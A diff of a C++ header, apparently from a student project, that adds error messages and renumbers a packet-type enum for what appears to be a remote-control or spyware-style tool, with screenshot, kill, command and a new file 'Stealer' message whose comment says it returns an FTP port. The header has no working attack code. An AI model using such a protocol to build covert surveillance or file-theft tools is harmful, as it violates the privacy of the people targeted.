@@ -5,7 +5,7 @@
 // Login   <galibe_s@epitech.net>
 //
 // Started on  Tue Oct 18 19:17:41 2016 stephane galibert
-// Last update Tue Oct 25 15:17:23 2016 stephane galibert
+// Last update Tue Nov  8 17:46:25 2016 stephane galibert
 //
 
 #pragma once
@@ -21,6 +21,9 @@
 #define BAD_PARAMETER "Error 45: bad parameter"
 #define BAD_PWD "Error 46: bad password"
 #define BAD_CMD "Error 47: unknown command"
+#define BAD_MAC "Error 48: bad mac address"
+#define BAD_FORMAT "Error 49.3: wrong file format"
+#define UNK_ERROR "Error 50: unknown error"
 
 enum class PacketType : uint16_t
 {
@@ -31,7 +34,9 @@ enum class PacketType : uint16_t
   PT_MouseEvent = 4,
   PT_Kill = 5,
   PT_Screenshot = 6,
-  PT_Command = 7
+  PT_Stealer = 7, // param: nom du fichier => return le port
+  PT_DeleteFTP = 8, // param: port (servira à delete le ftp associé) => return rien
+  PT_Command = 9
 };
 
 struct Packet
